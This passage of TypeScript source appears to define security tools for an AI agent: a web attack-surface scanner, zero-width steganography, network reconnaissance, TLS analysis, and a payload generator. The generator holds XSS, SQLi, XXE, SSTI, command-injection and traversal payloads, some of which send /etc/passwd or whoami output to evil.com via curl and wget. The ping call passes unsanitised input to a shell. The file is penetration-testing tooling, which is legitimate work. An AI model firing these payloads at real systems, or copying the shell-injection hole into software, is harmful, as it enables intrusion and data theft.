          if (resp.status < 500 && resp.status !== 405) {
            allowedMethods.push(`${method} (${resp.status})`)
          }
        } catch { /* skip */ }
      }

      lines.push(`Allowed: ${allowedMethods.join(', ') || 'Could not determine'}`)
      if (allowedMethods.some(m => m.startsWith('TRACE'))) {
        lines.push('**Warning**: TRACE method enabled — potential Cross-Site Tracing (XST) vulnerability')
      }
      if (allowedMethods.some(m => m.startsWith('PUT') || m.startsWith('DELETE'))) {
        lines.push('**Note**: PUT/DELETE methods available — verify proper authorization')
      }
      lines.push('')

      // 4. Security Headers
      lines.push('### 4. Security Headers')
      try {
        const resp = await fetchWithTimeout(url, {}, 10000)
        const headers = Object.fromEntries(resp.headers.entries())

        const secHeaders = [
          { name: 'Strict-Transport-Security', key: 'strict-transport-security', critical: true },
          { name: 'Content-Security-Policy', key: 'content-security-policy', critical: true },
          { name: 'X-Frame-Options', key: 'x-frame-options', critical: true },
          { name: 'X-Content-Type-Options', key: 'x-content-type-options', critical: false },
          { name: 'X-XSS-Protection', key: 'x-xss-protection', critical: false },
          { name: 'Referrer-Policy', key: 'referrer-policy', critical: false },
          { name: 'Permissions-Policy', key: 'permissions-policy', critical: false },
          { name: 'Cross-Origin-Opener-Policy', key: 'cross-origin-opener-policy', critical: false },
          { name: 'Cross-Origin-Resource-Policy', key: 'cross-origin-resource-policy', critical: false },
        ]

        let missingCritical = 0
        for (const sh of secHeaders) {
          const val = headers[sh.key]
          const status = val ? 'Present' : (sh.critical ? 'MISSING (critical)' : 'Missing')
          if (!val && sh.critical) missingCritical++
          lines.push(`- **${sh.name}**: ${val ? `\`${val.slice(0, 80)}\`` : status}`)
        }

        // Information disclosure
        const infoHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version']
        const disclosed = infoHeaders.filter(h => headers[h])
        if (disclosed.length > 0) {
          lines.push('')
          lines.push('**Information Disclosure**:')
          for (const h of disclosed) {
            lines.push(`- ${h}: \`${headers[h]}\``)
          }
        }
        lines.push('')

        if (missingCritical > 0) {
          lines.push(`**Warning**: ${missingCritical} critical security headers are missing.`)
          lines.push('')
        }
      } catch (e: any) {
        lines.push(`Error fetching headers: ${e.message}`)
        lines.push('')
      }

      // 5. Common Paths
      lines.push('### 5. Exposed Paths')
      const commonPaths = [
        '/.env', '/.git/HEAD', '/.git/config', '/wp-admin/', '/wp-login.php',
        '/admin/', '/administrator/', '/phpmyadmin/', '/server-status', '/server-info',
        '/robots.txt', '/sitemap.xml', '/.well-known/security.txt', '/api/',
        '/swagger/', '/swagger-ui/', '/api-docs/', '/graphql', '/debug/',
        '/.DS_Store', '/backup/', '/dump/', '/phpinfo.php', '/info.php',
        '/elmah.axd', '/trace.axd', '/.htaccess', '/web.config',
        '/crossdomain.xml', '/clientaccesspolicy.xml', '/readme.html',
      ]

      const exposedPaths: { path: string; status: number; size: number }[] = []
      const pathBatchSize = 10
      for (let i = 0; i < commonPaths.length; i += pathBatchSize) {
        const batch = commonPaths.slice(i, i + pathBatchSize)
        const results = await Promise.allSettled(
          batch.map(async (path) => {
            const resp = await fetchWithTimeout(`${url}${path}`, {
              redirect: 'follow',
            }, 5000)
            return { path, status: resp.status, size: parseInt(resp.headers.get('content-length') || '0', 10) }
          })
        )
        for (const r of results) {
          if (r.status === 'fulfilled' && r.value.status < 400) {
            exposedPaths.push(r.value)
          }
        }
      }

      if (exposedPaths.length > 0) {
        lines.push('| Path | Status | Size |')
        lines.push('|------|--------|------|')
        for (const ep of exposedPaths) {
          const warning = ['.env', '.git', 'phpinfo', '.htaccess', 'web.config', 'debug', 'dump', 'backup'].some(s => ep.path.includes(s))
            ? ' ⚠️' : ''
          lines.push(`| ${ep.path}${warning} | ${ep.status} | ${ep.size > 0 ? ep.size + 'B' : 'unknown'} |`)
        }
      } else {
        lines.push('No common sensitive paths found accessible.')
      }
      lines.push('')

      // Summary
      lines.push('---')
      lines.push('### Attack Surface Summary')
      lines.push(`- **DNS IPs**: ${dnsResults['A']?.length || 0} IPv4, ${dnsResults['AAAA']?.length || 0} IPv6`)
      lines.push(`- **Open ports**: ${openPorts.length}`)
      lines.push(`- **HTTP methods**: ${allowedMethods.length}`)
      lines.push(`- **Exposed paths**: ${exposedPaths.length}`)

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 14. steganography — Hide/extract data in text
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'steganography',
    description: 'Hide or extract secret messages in text using zero-width character encoding (ZWC). Uses zero-width space (U+200B = 0) and zero-width non-joiner (U+200C = 1) to encode binary data between words.',
    parameters: {
      action: { type: 'string', description: '"hide" or "extract"', required: true },
      carrier: { type: 'string', description: 'Carrier text (the visible text)', required: true },
      message: { type: 'string', description: 'Secret message to hide (required for hide action)' },
    },
    tier: 'free',
    async execute(args) {
      const action = String(args.action).toLowerCase()
      const carrier = String(args.carrier)

      const ZWS = '\u200B'  // zero-width space = 0
      const ZWNJ = '\u200C' // zero-width non-joiner = 1
      const ZWJ = '\u200D'  // zero-width joiner = separator between bytes
      const MARKER_START = '\u2060' // word joiner — marks start of hidden data
      const MARKER_END = '\uFEFF'   // byte order mark — marks end of hidden data

      if (action === 'hide') {
        const message = String(args.message || '')
        if (!message) return 'Error: message parameter required for hide action'

        // Convert message to binary
        const msgBuffer = Buffer.from(message, 'utf-8')
        const binaryChars: string[] = []

        for (const byte of msgBuffer) {
          const bits = byte.toString(2).padStart(8, '0')
          const encoded = bits.split('').map(b => b === '0' ? ZWS : ZWNJ).join('')
          binaryChars.push(encoded)
        }

        const hiddenData = MARKER_START + binaryChars.join(ZWJ) + MARKER_END

        // Insert hidden data between words
        const words = carrier.split(' ')
        let result: string

        if (words.length > 1) {
          // Insert after the first word
          result = words[0] + hiddenData + ' ' + words.slice(1).join(' ')
        } else {
          result = carrier + hiddenData
        }

        const lines: string[] = [
          '## Steganography — Hide',
          '',
          `**Visible text**: ${carrier}`,
          `**Hidden message**: ${message}`,
          `**Message size**: ${msgBuffer.length} bytes (${msgBuffer.length * 8} bits)`,
          `**Zero-width chars added**: ${hiddenData.length}`,
          '',
          '### Encoded Text (copy this)',
          '```',
          result,
          '```',
          '',
          '**Note**: The text above looks identical to the carrier but contains hidden zero-width characters.',
          `**Carrier length**: ${carrier.length} chars`,
          `**Encoded length**: ${result.length} chars`,
          `**Added**: ${result.length - carrier.length} invisible characters`,
        ]

        return lines.join('\n')

      } else if (action === 'extract') {
        // Find hidden data between markers
        const startIdx = carrier.indexOf(MARKER_START)
        const endIdx = carrier.indexOf(MARKER_END)

        if (startIdx === -1 || endIdx === -1 || endIdx <= startIdx) {
          // Try without markers — just look for zero-width characters
          const zwChars = carrier.match(/[\u200B\u200C\u200D]+/g)
          if (!zwChars || zwChars.length === 0) {
            return '## Steganography — Extract\n\nNo hidden data found in the carrier text. The text does not contain zero-width characters.'
          }

          // Try to decode without markers
          const allZW = zwChars.join('')
          const bytes: number[] = []
          const bitGroups = allZW.split(ZWJ)

          for (const group of bitGroups) {
            if (group.length === 0) continue
            let byte = 0
            for (const char of group) {
              byte = (byte << 1) | (char === ZWNJ ? 1 : 0)
            }
            bytes.push(byte)
          }

          const decoded = Buffer.from(bytes).toString('utf-8')

          return [
            '## Steganography — Extract',
            '',
            '**Note**: No markers found, attempting best-effort decode of zero-width characters.',
            '',
            `**Zero-width characters found**: ${allZW.length}`,
            `**Decoded bytes**: ${bytes.length}`,
            '',
            '### Extracted Message',
            '```',
            decoded,
            '```',
          ].join('\n')
        }

        const hiddenData = carrier.slice(startIdx + 1, endIdx)
        const byteGroups = hiddenData.split(ZWJ)
        const bytes: number[] = []

        for (const group of byteGroups) {
          if (group.length === 0) continue
          let byte = 0
          for (const char of group) {
            byte = (byte << 1) | (char === ZWNJ ? 1 : 0)
          }
          bytes.push(byte)
        }

        const decoded = Buffer.from(bytes).toString('utf-8')

        // Also show the visible text without the hidden data
        const visibleText = carrier.slice(0, startIdx) + carrier.slice(endIdx + 1)

        return [
          '## Steganography — Extract',
          '',
          `**Visible text**: ${visibleText.trim()}`,
          `**Hidden bytes**: ${bytes.length}`,
          '',
          '### Extracted Secret Message',
          '```',
          decoded,
          '```',
        ].join('\n')

      } else {
        return 'Error: action must be "hide" or "extract"'
      }
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 15. network_info — Network reconnaissance
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'network_info',
    description: 'Network reconnaissance for an IP or hostname. Performs DNS lookup, reverse DNS, geolocation (via ip-api.com), ASN info, and ping response time.',
    parameters: {
      target: { type: 'string', description: 'IP address or hostname', required: true },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      const target = String(args.target).replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/:.*$/, '').trim()

      const lines: string[] = [
        '## Network Reconnaissance',
        '',
        `**Target**: ${target}`,
        '',
      ]

      // DNS lookup
      const resolver = new Resolver()
      resolver.setServers(['8.8.8.8', '1.1.1.1'])

      let ips: string[] = []
      let isIP = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(target)

      if (!isIP) {
        try {
          ips = await resolver.resolve4(target)
          lines.push(`### DNS Resolution`)
          lines.push(`- **IPv4**: ${ips.join(', ')}`)
          try {
            const ipv6 = await resolver.resolve6(target)
            lines.push(`- **IPv6**: ${ipv6.join(', ')}`)
          } catch { /* no AAAA */ }
          lines.push('')
        } catch (e: any) {
          lines.push(`**DNS resolution failed**: ${e.message}`)
          lines.push('')
        }
      } else {
        ips = [target]
      }

      // Reverse DNS
      if (ips.length > 0) {
        try {
          const reverse = await resolver.reverse(ips[0])
          lines.push(`### Reverse DNS`)
          lines.push(`- ${ips[0]} -> ${reverse.join(', ')}`)
          lines.push('')
        } catch {
          lines.push('### Reverse DNS')
          lines.push('- No PTR record found')
          lines.push('')
        }
      }

      // Geolocation via ip-api.com
      const lookupIp = ips[0] || target
      try {
        const resp = await fetchWithTimeout(
          `http://ip-api.com/json/${lookupIp}?fields=status,message,continent,country,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query`,
          {}, 10000
        )
        const geo = await resp.json() as any

        if (geo.status === 'success') {
          lines.push('### Geolocation')
          lines.push('| Field | Value |')
          lines.push('|-------|-------|')
          lines.push(`| IP | ${geo.query} |`)
          lines.push(`| Country | ${geo.country} |`)
          lines.push(`| Region | ${geo.regionName} |`)
          lines.push(`| City | ${geo.city} |`)
          if (geo.zip) lines.push(`| ZIP | ${geo.zip} |`)
          lines.push(`| Coordinates | ${geo.lat}, ${geo.lon} |`)
          lines.push(`| Timezone | ${geo.timezone} |`)
          lines.push(`| ISP | ${geo.isp} |`)
          lines.push(`| Organization | ${geo.org} |`)
          lines.push(`| AS | ${geo.as} |`)
          lines.push(`| AS Name | ${geo.asname} |`)
          if (geo.mobile) lines.push(`| Mobile | Yes |`)
          if (geo.proxy) lines.push(`| Proxy/VPN | Yes |`)
          if (geo.hosting) lines.push(`| Hosting/DC | Yes |`)
          lines.push('')
        } else {
          lines.push(`### Geolocation — Failed: ${geo.message || 'unknown error'}`)
          lines.push('')
        }
      } catch (e: any) {
        lines.push(`### Geolocation — Error: ${e.message}`)
        lines.push('')
      }

      // Ping
      try {
        const pingOutput = execSync(`ping -c 3 -W 3 ${target} 2>/dev/null || ping -n 3 -w 3000 ${target} 2>/dev/null`, {
          timeout: 15000,
        }).toString()

        const avgMatch = pingOutput.match(/(?:avg|average)\s*[=/]\s*([\d.]+)/i) ||
                          pingOutput.match(/[\d.]+\/([\d.]+)\/[\d.]+/)
        const lossMatch = pingOutput.match(/(\d+)%\s*(?:packet\s*)?loss/i)

        lines.push('### Ping')
        if (avgMatch) lines.push(`- **Average RTT**: ${avgMatch[1]}ms`)
        if (lossMatch) lines.push(`- **Packet loss**: ${lossMatch[1]}%`)
        if (!avgMatch && !lossMatch) {
          lines.push('```')
          lines.push(pingOutput.trim().split('\n').slice(-3).join('\n'))
          lines.push('```')
        }
        lines.push('')
      } catch {
        lines.push('### Ping — Host unreachable or ping blocked')
        lines.push('')
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 16. ssl_analyze — Deep SSL/TLS analysis
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'ssl_analyze',
    deprecated: true,
    description: 'Deep SSL/TLS analysis using Node.js tls module. Returns protocol version, cipher suite, certificate details (issuer, subject, validity, SANs), certificate chain, HSTS status, and potential security issues.',
    parameters: {
      host: { type: 'string', description: 'Hostname to analyze', required: true },
      port: { type: 'string', description: 'Port number (default: 443)', default: '443' },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      const host = String(args.host).replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/:.*$/, '').trim()
      const port = parseInt(String(args.port || '443'), 10)

      const lines: string[] = [
        '## SSL/TLS Analysis',
        '',
        `**Host**: ${host}:${port}`,
        '',
      ]

      return new Promise<string>((resolve) => {
        const socket = tlsConnect({
          host,
          port,
          servername: host,
          rejectUnauthorized: false, // We want to analyze even bad certs
          timeout: 15000,
        }, () => {
          try {
            const cert = socket.getPeerCertificate(true)
            const protocol = socket.getProtocol()
            const cipher = socket.getCipher()
            const authorized = socket.authorized

            // Protocol & Cipher
            lines.push('### Connection')
            lines.push(`- **Protocol**: ${protocol || 'unknown'}`)
            lines.push(`- **Cipher**: ${cipher?.name || 'unknown'}`)
            lines.push(`- **Cipher version**: ${cipher?.version || 'unknown'}`)
            lines.push(`- **Certificate valid**: ${authorized ? 'Yes' : `No — ${socket.authorizationError || 'unknown error'}`}`)
            lines.push('')

            if (cert && cert.subject) {
              // Certificate details
              lines.push('### Certificate')
              lines.push('| Field | Value |')
              lines.push('|-------|-------|')
              lines.push(`| Subject CN | ${cert.subject?.CN || 'N/A'} |`)
              lines.push(`| Subject O | ${cert.subject?.O || 'N/A'} |`)
              lines.push(`| Issuer CN | ${cert.issuer?.CN || 'N/A'} |`)
              lines.push(`| Issuer O | ${cert.issuer?.O || 'N/A'} |`)
              lines.push(`| Valid From | ${cert.valid_from || 'N/A'} |`)
              lines.push(`| Valid To | ${cert.valid_to || 'N/A'} |`)
              lines.push(`| Serial | ${cert.serialNumber || 'N/A'} |`)
              lines.push(`| Fingerprint (SHA-256) | ${cert.fingerprint256 || 'N/A'} |`)
              lines.push(`| Bits | ${cert.bits || 'N/A'} |`)
              lines.push(`| Signature Algorithm | ${(cert as any).sigalg || cert.asn1Curve || 'N/A'} |`)
              lines.push('')

              // SANs
              const altNames = cert.subjectaltname
              if (altNames) {
                const sans = altNames.split(',').map((s: string) => s.trim())
                lines.push('### Subject Alternative Names')
                for (const san of sans.slice(0, 20)) {
                  lines.push(`- ${san}`)
                }
                if (sans.length > 20) lines.push(`... and ${sans.length - 20} more`)
                lines.push('')
              }

              // Certificate chain
              lines.push('### Certificate Chain')
              let current: any = cert
              let depth = 0
              const seenFP = new Set<string>()
              while (current && depth < 5) {
                const fp = current.fingerprint256 || current.fingerprint || ''
                if (seenFP.has(fp)) break
                seenFP.add(fp)
                lines.push(`${depth}. **${current.subject?.CN || 'unknown'}** (${current.issuer?.O || current.issuer?.CN || 'unknown'})`)
                current = current.issuerCertificate
                depth++
              }
              lines.push('')

              // Expiration check
              if (cert.valid_to) {
                const expDate = new Date(cert.valid_to)
                const daysLeft = Math.ceil((expDate.getTime() - Date.now()) / (1000 * 60 * 60 * 24))
                if (daysLeft < 0) {
                  lines.push(`**CRITICAL**: Certificate expired ${Math.abs(daysLeft)} days ago!`)
                } else if (daysLeft < 30) {
                  lines.push(`**WARNING**: Certificate expires in ${daysLeft} days!`)
                } else {
                  lines.push(`**Certificate expires in**: ${daysLeft} days`)
                }
              }

              // Security issues
              const issues: string[] = []

              if (protocol && ['SSLv3', 'TLSv1', 'TLSv1.1'].includes(protocol)) {
                issues.push(`Outdated protocol: ${protocol} — upgrade to TLS 1.2+`)
              }

              if (cert.bits && cert.bits < 2048) {
                issues.push(`Weak key size: ${cert.bits} bits — minimum recommended is 2048`)
              }

              const weakCiphers = ['RC4', 'DES', '3DES', 'MD5', 'NULL', 'EXPORT']
              if (cipher?.name) {
                for (const wc of weakCiphers) {
                  if (cipher.name.includes(wc)) {
                    issues.push(`Weak cipher: ${cipher.name} contains ${wc}`)
                  }
                }
              }

              if (cert.subject?.CN && !cert.subjectaltname?.includes(host) && cert.subject.CN !== host) {
                issues.push(`Certificate CN (${cert.subject.CN}) does not match host (${host})`)
              }

              if (issues.length > 0) {
                lines.push('')
                lines.push('### Security Issues')
                for (const issue of issues) lines.push(`- ${issue}`)
              }
            }

          } catch (e: any) {
            lines.push(`Error reading certificate: ${e.message}`)
          }

          socket.destroy()

          // Check HSTS via HTTP
          fetchWithTimeout(`https://${host}:${port}/`, {}, 10000)
            .then(resp => {
              const hsts = resp.headers.get('strict-transport-security')
              if (hsts) {
                lines.push('')
                lines.push('### HSTS')
                lines.push(`- \`${hsts}\``)
                if (hsts.includes('includeSubDomains')) lines.push('- Includes subdomains')
                if (hsts.includes('preload')) lines.push('- Preload enabled')
                const maxAgeMatch = hsts.match(/max-age=(\d+)/)
                if (maxAgeMatch) {
                  const days = parseInt(maxAgeMatch[1], 10) / 86400
                  lines.push(`- Max age: ${days.toFixed(0)} days${days < 365 ? ' (recommended: >= 365)' : ''}`)
                }
              } else {
                lines.push('')
                lines.push('### HSTS')
                lines.push('- **Not set** — the site is vulnerable to protocol downgrade attacks')
              }
              resolve(lines.join('\n'))
            })
            .catch(() => {
              resolve(lines.join('\n'))
            })
        })

        socket.on('error', (err: Error) => {
          lines.push(`**Error**: ${err.message}`)
          resolve(lines.join('\n'))
        })

        socket.on('timeout', () => {
          lines.push('**Error**: Connection timed out')
          socket.destroy()
          resolve(lines.join('\n'))
        })
      })
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 17. payload_generate — Security test payload generator
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'payload_generate',
    description: 'Generate context-aware security testing payloads for XSS, SQLi, XXE, SSTI, command injection, path traversal, and header injection. Supports multiple encoding types.',
    parameters: {
      type: { type: 'string', description: 'Payload type: xss, sqli, xxe, ssti, command, traversal, header', required: true },
      context: { type: 'string', description: 'Injection context: html, javascript, attribute, url, json', default: 'html' },
      encoding: { type: 'string', description: 'Encoding: none, url, html, unicode, double', default: 'none' },
    },
    tier: 'free',
    async execute(args) {
      const type = String(args.type).toLowerCase()
      const context = String(args.context || 'html').toLowerCase()
      const encoding = String(args.encoding || 'none').toLowerCase()

      const payloads: { payload: string; description: string }[] = []

      // Generate payloads based on type and context
      switch (type) {
        case 'xss':
          switch (context) {
            case 'html':
              payloads.push(
                { payload: '<script>alert(document.domain)</script>', description: 'Basic script injection' },
                { payload: '<img src=x onerror=alert(1)>', description: 'Image error handler' },
                { payload: '<svg onload=alert(1)>', description: 'SVG onload' },
                { payload: '<body onload=alert(1)>', description: 'Body onload' },
                { payload: '<details open ontoggle=alert(1)>', description: 'Details toggle' },
                { payload: '<input onfocus=alert(1) autofocus>', description: 'Input autofocus' },
                { payload: '<marquee onstart=alert(1)>', description: 'Marquee onstart' },
                { payload: '<video src=x onerror=alert(1)>', description: 'Video error' },
                { payload: '<iframe srcdoc="<script>alert(1)</script>">', description: 'Iframe srcdoc' },
                { payload: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', description: 'Mutation XSS' },
              )
              break
            case 'javascript':
              payloads.push(
                { payload: "'-alert(1)-'", description: 'String breakout (single quote)' },
                { payload: '"-alert(1)-"', description: 'String breakout (double quote)' },
                { payload: "';alert(1)//", description: 'Statement termination (single)' },
                { payload: '";alert(1)//', description: 'Statement termination (double)' },
                { payload: '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e', description: 'Hex encoded tags' },
                { payload: '${alert(1)}', description: 'Template literal injection' },
                { payload: '`${alert(1)}`', description: 'Template literal full' },
                { payload: "constructor.constructor('alert(1)')()", description: 'Constructor bypass' },
                { payload: "[].constructor.constructor('alert(1)')()", description: 'Array constructor' },
                { payload: 'import("data:text/javascript,alert(1)")', description: 'Dynamic import' },
              )
              break
            case 'attribute':
              payloads.push(
                { payload: '" onfocus="alert(1)" autofocus="', description: 'Double-quote breakout + event' },
                { payload: "' onfocus='alert(1)' autofocus='", description: 'Single-quote breakout + event' },
                { payload: '" onmouseover="alert(1)', description: 'Mouseover event' },
                { payload: '"><script>alert(1)</script>', description: 'Tag breakout (double)' },
                { payload: "'><script>alert(1)</script>", description: 'Tag breakout (single)' },
                { payload: '" style="background:url(javascript:alert(1))"', description: 'Style injection' },
                { payload: 'javascript:alert(1)', description: 'JavaScript protocol (href/src)' },
                { payload: 'data:text/html,<script>alert(1)</script>', description: 'Data URI (src/href)' },
                { payload: '" accesskey="x" onclick="alert(1)" x="', description: 'Accesskey + onclick' },
                { payload: '" tabindex="1" onfocus="alert(1)" ', description: 'Tabindex + onfocus' },
              )
              break
            case 'url':
              payloads.push(
                { payload: 'javascript:alert(1)', description: 'JavaScript protocol' },
                { payload: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', description: 'Base64 data URI' },
                { payload: 'javascript:alert(String.fromCharCode(88,83,83))', description: 'Charcode obfuscation' },
                { payload: '//evil.com', description: 'Protocol-relative redirect' },
                { payload: 'jaVaScRiPt:alert(1)', description: 'Mixed case protocol' },
                { payload: 'java%0ascript:alert(1)', description: 'Newline in protocol' },
                { payload: 'java%09script:alert(1)', description: 'Tab in protocol' },
                { payload: '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)', description: 'HTML entity encoded' },
              )
              break
            case 'json':
              payloads.push(
                { payload: '{"key":"value<script>alert(1)</script>"}', description: 'Script in JSON value' },
                { payload: '{"key":"value\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}', description: 'Unicode-escaped script' },
                { payload: '{"__proto__":{"isAdmin":true}}', description: 'Prototype pollution' },
                { payload: '{"constructor":{"prototype":{"isAdmin":true}}}', description: 'Constructor pollution' },
              )
              break
          }
          break

        case 'sqli':
          payloads.push(
            { payload: "' OR 1=1--", description: 'Classic OR bypass' },
            { payload: "' UNION SELECT NULL,NULL,NULL--", description: 'UNION column discovery' },
            { payload: "' AND 1=1--", description: 'Boolean true (for blind SQLi)' },
            { payload: "' AND 1=2--", description: 'Boolean false (compare with true)' },
            { payload: "' AND SLEEP(5)--", description: 'Time-based blind (MySQL)' },
            { payload: "'; WAITFOR DELAY '0:0:5'--", description: 'Time-based blind (MSSQL)' },
            { payload: "' AND pg_sleep(5)--", description: 'Time-based blind (PostgreSQL)' },
            { payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", description: 'Table enumeration' },
            { payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", description: 'Column enumeration' },
            { payload: "' OR '1'='1' /*", description: 'Comment-based bypass' },
            { payload: "admin'--", description: 'Auth bypass (admin)' },
            { payload: "1' ORDER BY 1--+", description: 'Column count detection' },
            { payload: "1' ORDER BY 100--+", description: 'Column count detection (error)' },
            { payload: "-1 OR 1=1", description: 'Numeric injection' },
            { payload: "1; DROP TABLE users--", description: 'Stacked query (destructive)' },
          )
          break

        case 'xxe':
          payloads.push(
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', description: 'Classic XXE (file read)' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>', description: 'Shadow file read' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>', description: 'SSRF via XXE' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo>bar</foo>', description: 'Out-of-band XXE via DTD' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', description: 'PHP filter XXE' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', description: 'Command execution via expect' },
            { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>', description: 'DoS via /dev/random' },
            { payload: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><foo>&lol3;</foo>', description: 'Billion laughs (DoS)' },
          )
          break

        case 'ssti':
          payloads.push(
            { payload: '{{7*7}}', description: 'Basic math (Jinja2/Twig/Handlebars)' },
            { payload: '${7*7}', description: 'Basic math (EL/Thymeleaf/Freemarker)' },
            { payload: '<%= 7*7 %>', description: 'Basic math (ERB/EJS)' },
            { payload: '#{7*7}', description: 'Basic math (Slim/Pug/Jade)' },
            { payload: "{{''.__class__.__mro__[2].__subclasses__()}}", description: 'Jinja2 class traversal' },
            { payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", description: 'Jinja2 RCE' },
            { payload: "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}", description: 'Jinja2 subprocess' },
            { payload: '${T(java.lang.Runtime).getRuntime().exec("id")}', description: 'Spring EL RCE' },
            { payload: '__import__("os").popen("id").read()', description: 'Python eval RCE' },
            { payload: '{{constructor.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}', description: 'Node.js SSTI RCE' },
            { payload: '<%- global.process.mainModule.require("child_process").execSync("id") %>', description: 'EJS RCE' },
          )
          break

        case 'command':
          payloads.push(
            { payload: '; id', description: 'Semicolon chaining' },
            { payload: '| id', description: 'Pipe chaining' },
            { payload: '`id`', description: 'Backtick execution' },
            { payload: '$(id)', description: 'Command substitution' },
            { payload: '&& id', description: 'AND chaining' },
            { payload: '|| id', description: 'OR chaining' },
            { payload: '\nid', description: 'Newline injection' },
            { payload: '; cat /etc/passwd', description: 'File read (Linux)' },
            { payload: '& type C:\\Windows\\win.ini', description: 'File read (Windows)' },
            { payload: '${IFS}id', description: 'IFS space bypass' },
            { payload: '{cat,/etc/passwd}', description: 'Brace expansion' },
            { payload: 'cat${IFS}/etc${IFS}passwd', description: 'IFS path bypass' },
            { payload: "'; ping -c 3 evil.com #", description: 'Out-of-band (ping)' },
            { payload: "'; curl evil.com/$(whoami) #", description: 'Out-of-band (curl)' },
            { payload: "'; wget evil.com/$(cat /etc/passwd | base64) #", description: 'Data exfiltration' },
          )
          break

        case 'traversal':
          payloads.push(
            { payload: '../../../etc/passwd', description: 'Basic traversal (Linux)' },
            { payload: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', description: 'Basic traversal (Windows)' },
            { payload: '....//....//....//etc/passwd', description: 'Double-dot slash bypass' },
            { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', description: 'URL-encoded traversal' },
            { payload: '%252e%252e%252f%252e%252e%252fetc%252fpasswd', description: 'Double URL-encoded' },
            { payload: '..%c0%af..%c0%afetc%c0%afpasswd', description: 'UTF-8 overlong encoding' },
            { payload: '..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd', description: 'Unicode fullwidth slash' },
            { payload: '..;/..;/..;/etc/passwd', description: 'Semicolon bypass (Tomcat)' },
            { payload: '..%00/etc/passwd', description: 'Null byte termination' },
            { payload: '/proc/self/environ', description: 'Process environment' },
            { payload: '/proc/self/cmdline', description: 'Process command line' },
            { payload: 'php://filter/convert.base64-encode/resource=/etc/passwd', description: 'PHP filter wrapper' },
            { payload: 'file:///etc/passwd', description: 'File protocol' },
          )
          break

        case 'header':
          payloads.push(
            { payload: 'Host: evil.com', description: 'Host header injection' },
            { payload: 'X-Forwarded-For: 127.0.0.1', description: 'IP spoofing (XFF)' },
            { payload: 'X-Forwarded-Host: evil.com', description: 'Host override (XFH)' },
            { payload: 'X-Original-URL: /admin', description: 'URL override (Nginx)' },
            { payload: 'X-Rewrite-URL: /admin', description: 'URL rewrite (IIS)' },
            { payload: 'X-Custom-IP-Authorization: 127.0.0.1', description: 'Custom IP authorization' },
            { payload: 'Referer: https://admin.target.com', description: 'Referer spoofing' },
            { payload: 'Content-Type: application/json', description: 'Content-Type switching' },
            { payload: 'Transfer-Encoding: chunked', description: 'HTTP smuggling (TE)' },
            { payload: 'X-HTTP-Method-Override: PUT', description: 'Method override' },
          )
          break

        default:
          return `Error: Unknown payload type "${type}". Available: xss, sqli, xxe, ssti, command, traversal, header`
      }

      // Apply encoding
      function encode(s: string, enc: string): string {
        switch (enc) {
          case 'url': return encodeURIComponent(s)
          case 'html': {
            const map: Record<string, string> = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }
            return s.replace(/[&<>"']/g, c => map[c] || c)
          }
          case 'unicode':
            return Array.from(s).map(c => {
              const code = c.charCodeAt(0)
              return code > 127 || '<>"\'&;'.includes(c)
                ? '\\u' + code.toString(16).padStart(4, '0')
                : c
            }).join('')
          case 'double': return encodeURIComponent(encodeURIComponent(s))
          default: return s
        }
      }

      const lines: string[] = [
        '## Security Test Payloads',
        '',
        `**Type**: ${type.toUpperCase()}`,
        `**Context**: ${context}`,
        `**Encoding**: ${encoding}`,
